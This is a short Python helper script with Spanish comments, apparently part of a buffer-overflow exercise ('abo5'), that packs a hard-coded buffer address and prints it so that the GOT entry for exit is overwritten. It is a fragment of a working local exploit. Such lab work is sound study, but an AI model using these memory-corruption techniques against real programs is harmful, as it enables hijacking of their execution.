#! /usr/bin/env python
"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """
   
import sys
from struct import pack
   	 
buf_addr = 0xffffdbe0                        #???? addr de buf
#buf_addr = 0xffffca10 
  
exploit = pack("<I", buf_addr)                  #sobreescribo exit en la GOT
   
sys.stdout.write(exploit)
